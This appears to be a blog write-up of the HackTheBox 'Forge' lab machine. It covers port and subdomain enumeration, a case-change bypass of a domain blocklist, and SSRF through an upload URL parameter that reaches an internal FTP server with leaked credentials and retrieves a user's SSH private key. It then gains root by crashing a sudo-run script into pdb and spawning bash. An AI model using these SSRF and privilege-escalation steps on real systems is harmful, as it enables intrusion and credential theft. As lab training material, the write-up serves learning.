<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Forge | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="Machine vulnerable to `SSRF` that teaches about Python Debugger exploitation."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_forge/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_forge/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Forge"/><meta property="og:description" content="Machine vulnerable to `SSRF` that teaches about Python Debugger exploitation."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_forge/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_lFbIv9O.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-10-22T16:48:00+07:00"/><meta property="article:modified_time" content="2023-05-13T11:19:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_lFbIv9O.png"/><meta name="twitter:title" content="HackTheBox Writeup: Forge"/><meta name="twitter:description" content="Machine vulnerable to `SSRF` that teaches about Python Debugger exploitation."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Forge","item":"https://xzebra.dev/blog/hackthebox_writeup_forge/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Forge","name":"HackTheBox Writeup: Forge","description":"Machine vulnerable to `SSRF` that teaches about Python Debugger exploitation.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration sudo nmap -sC -sS -sV -F 10.10.11.111 \u003escan.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-22 12:04 EEST Nmap scan report for 10.10.11.111 Host is up (0.066s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://forge.htb Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds As soon as you enter the page, you get redirected to forge.htb. We have to include that in /etc/hosts.\nGetting the foothold If we try to upload a reverse shell, the file is uploaded. But, if you go to the url they give you, it seems like an image is shown.\nI tried using the remote upload feature. By using as input localhost or forge.htb we get an error about those domains are banned.\nBy using http://10.10.11.111/index.php we get a weird error I couldnâ€™t fix. It redirected the IP to the forge.htb domain, but the / disapeared.\nAn error occured! Error : HTTPConnectionPool(host='forge.htbindex.php', port=80): Max retries exceeded with url: / (Caused by NewConnectionError(': Failed to establish a new connection: [Errno -3] Temporary failure in name resolution')) After a lot of tries, I simply put the forge.htb domain in capital letters and it workedâ€¦ So we can bypass the banned domain list.\nBy using gobuster, I found an admin subdomain: admin.forge.htb\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Domain: forge.htb [+] Threads: 10 [+] Timeout: 1s [+] Wordlist: /usr/share/dirbuster/directory-list-2.3-medium.txt =============================================================== 2021/10/22 18:32:00 Starting gobuster in DNS enumeration mode =============================================================== Found: admin.forge.htb which says:\nOnly localhost is allowed! By using the upload from url we might be able to perform a Server Side Request Forgery (nice machine name btw). Input http://ADMIN.FORGE.HTB:\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAdmin Portal\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u003e \u003cheader\u003e \u003cnav\u003e \u003ch1 class=\"\"\u003e\u003ca href=\"/\"\u003ePortal home\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right margin-right\"\u003e\u003ca href=\"/announcements\"\u003eAnnouncements\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right\"\u003e\u003ca href=\"/upload\"\u003eUpload image\u003c/a\u003e\u003c/h1\u003e \u003c/nav\u003e \u003c/header\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003ccenter\u003e\u003ch1\u003eWelcome Admins!\u003c/h1\u003e\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e The announcements page looks like this:\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAnnouncements\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\"\u003e \u003cheader\u003e \u003cnav\u003e \u003ch1 class=\"\"\u003e\u003ca href=\"/\"\u003ePortal home\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right margin-right\"\u003e\u003ca href=\"/announcements\"\u003eAnnouncements\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right\"\u003e\u003ca href=\"/upload\"\u003eUpload image\u003c/a\u003e\u003c/h1\u003e \u003c/nav\u003e \u003c/header\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003cul\u003e \u003cli\u003eAn internal ftp server has been setup with credentials as user:heightofsecurity123!\u003c/li\u003e \u003cli\u003eThe /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\u003c/li\u003e \u003cli\u003eThe /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026lt;url\u0026gt;.\u003c/li\u003e \u003c/ul\u003e \u003c/body\u003e \u003c/html\u003e If you try to login to the ftp server, a connection canâ€™t be established. Although, the announcements also mention the possibility to use the /upload with ftp. Letâ€™s try that: http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB\nIt succesfully uploaded the file, so we can check the content with curl:\ndrwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Oct 22 12:30 user.txt It is actually the user directory. As we canâ€™t upload anything directly to this directory, letâ€™s check if we can get an ssh key (as there is an ssh service).\nIf we check the .ssh folder with the following query: http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/ we can see there is a RSA key:\n-rw------- 1 1000 1000 564 May 31 12:35 authorized_keys -rw------- 1 1000 1000 2590 May 20 08:30 id_rsa -rw------- 1 1000 1000 564 May 20 08:30 id_rsa.pub We can grab it with the following query and save it in a file (ssh_user). http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa\nssh -i ssh_user user@10.10.11.111 And we logged in!\nPrivilege escalation Letâ€™s check for things to run like sudo without password:\nuser@forge:~$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py Here is the script:\n#!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:{port}') (clientsock, addr) = sock.accept() clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit() It is opening a TCP socket locally and running as a server to perform some simple administration comands (nothing aparently dangerous). But if you think about it, we could create for example a df executable and add it to the path, so that would be executed instead of the original one.\nWe can run the script like this:\nsudo python3 /opt/remote-manage.py Listening on localhost:38134 We can see in the script that there is a hardcoded password which you can input if you open a new ssh connection with a netcat command (to connect to the tcp socket).\nuser@forge:~$ nc localhost 38134 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit I was going to do the malicious df executable until I saw import pdb. PDB is the Python Debugger, which can also run python, so we could create an interactive shell.\nThe debugger is being called when there is an error in the try. We can easily enter the except if we input something that is not a number or even close the connection while being asked.\nuser@forge:~$ nc localhost 38134 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit ^C This will create a pdb session in the server ssh session.\nsudo python3 /opt/remote-manage.py Listening on localhost:38134 invalid literal for int() with base 10: b'' \u003e /opt/remote-manage.py(27)() -\u003e option = int(clientsock.recv(1024).strip()) (Pdb) As we said, pdb lets you run python code. Youâ€™d probably now at this point how to call an interactive shell with python:\nListening on localhost:38134 invalid literal for int() with base 10: b'' \u003e /opt/remote-manage.py(27)() -\u003e option = int(clientsock.recv(1024).strip()) (Pdb) import pty (Pdb) pty.spawn(\"/bin/bash\") root@forge:/home/user# And then we can read the root flag ðŸ¤ .\n","wordCount":"1086","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_lFbIv9O.png","datePublished":"2021-10-22T16:48:00+07:00","dateModified":"2023-05-13T11:19:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_forge/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Forge</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">Machine vulnerable to <code>SSRF</code> that teaches about Python Debugger exploitation.</div><div class="post-meta"><span title="2021-10-22 16:48:00 +0700 +0700">October 22, 2021</span>Â Â·Â 6 minÂ Â·Â Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_lFbIv9O.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo nmap -sC -sS -sV -F 10.10.11.111 &gt;scan.txt
</span></span></code></pre></div><pre tabindex="0"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-22 12:04 EEST
Nmap scan report for 10.10.11.111
Host is up (0.066s latency).
Not shown: 97 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
</code></pre><p>As soon as you enter the page, you get redirected to forge.htb. We have to include that in /etc/hosts.</p><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>If we try to upload a reverse shell, the file is uploaded. But, if you go to the url they give you, it seems like an image is shown.</p><p>I tried using the remote upload feature. By using as input localhost or forge.htb we get an error about those domains are banned.</p><p>By using <a href="http://10.10.11.111/">http://10.10.11.111/index.php</a> we get a weird error I couldnâ€™t fix. It redirected the IP to the forge.htb domain, but the / disapeared.</p><pre tabindex="0"><code>An error occured! Error : HTTPConnectionPool(host=&#39;forge.htbindex.php&#39;, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f6fac13dd00&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution&#39;))
</code></pre><p>After a lot of tries, I simply put the forge.htb domain in capital letters and it workedâ€¦ So we can bypass the banned domain list.</p><p>By using gobuster, I found an admin subdomain: admin.forge.htb</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Gobuster v3.1.0
</span></span><span style="display:flex"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain:     forge.htb
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:    <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:    1s
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:   /usr/share/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>2021/10/22 18:32:00 Starting gobuster in DNS enumeration mode
</span></span><span style="display:flex"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex"><span>Found: admin.forge.htb
</span></span></code></pre></div><p>which says:</p><pre tabindex="0"><code>Only localhost is allowed!
</code></pre><p>By using the upload from url we might be able to perform a Server Side Request Forgery (nice machine name btw). Input <a href="http://admin.forge.htb/">http://ADMIN.FORGE.HTB</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">title</span>&gt;Admin Portal&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;Welcome Admins!&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>The announcements page looks like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">title</span>&gt;Announcements&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/announcements.css&#34;</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex"><span>            &lt;<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span>&gt;Portal home&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right margin-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/announcements&#34;</span>&gt;Announcements&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>                &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;align-right&#34;</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/upload&#34;</span>&gt;Upload image&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex"><span>            &lt;/<span style="color:#f92672">nav</span>&gt;
</span></span><span style="display:flex"><span>    &lt;/<span style="color:#f92672">header</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex"><span>    &lt;<span style="color:#f92672">ul</span>&gt;
</span></span><span style="display:flex"><span>        &lt;<span style="color:#f92672">li</span>&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex"><span>        &lt;<span style="color:#f92672">li</span>&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/<span style="color:#f92672">li</span>&gt;
</span></span><span style="display:flex"><span>    &lt;/<span style="color:#f92672">ul</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>If you try to login to the ftp server, a connection canâ€™t be established. Although, the announcements also mention the possibility to use the /upload with ftp. Letâ€™s try that: <a href="http://admin.forge.htb/upload?u=ftp%3A%2F%2Fuser%3Aheightofsecurity123!%40FORGE.HTB">http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB</a></p><p>It succesfully uploaded the file, so we can check the content with curl:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>         <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">04</span> 19:23 snap
</span></span><span style="display:flex"><span>-rw-r-----    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">1000</span>           <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">22</span> 12:30 user.txt
</span></span></code></pre></div><p>It is actually the user directory. As we canâ€™t upload anything directly to this directory, letâ€™s check if we can get an ssh key (as there is an ssh service).</p><p>If we check the .ssh folder with the following query: <a href="http://admin.forge.htb/upload?u=ftp%3A%2F%2Fuser%3Aheightofsecurity123!%40FORGE.HTB%2F.ssh%2F">http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/</a> we can see there is a RSA key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>-rw-------    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>          <span style="color:#ae81ff">564</span> May <span style="color:#ae81ff">31</span> 12:35 authorized_keys
</span></span><span style="display:flex"><span>-rw-------    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>         <span style="color:#ae81ff">2590</span> May <span style="color:#ae81ff">20</span> 08:30 id_rsa
</span></span><span style="display:flex"><span>-rw-------    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1000</span>     <span style="color:#ae81ff">1000</span>          <span style="color:#ae81ff">564</span> May <span style="color:#ae81ff">20</span> 08:30 id_rsa.pub
</span></span></code></pre></div><p>We can grab it with the following query and save it in a file (ssh_user). <a href="http://admin.forge.htb/upload?u=ftp%3A%2F%2Fuser%3Aheightofsecurity123!%40FORGE.HTB%2F.ssh%2Fid_rsa">http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa</a></p><pre tabindex="0"><code>ssh -i ssh_user user@10.10.11.111
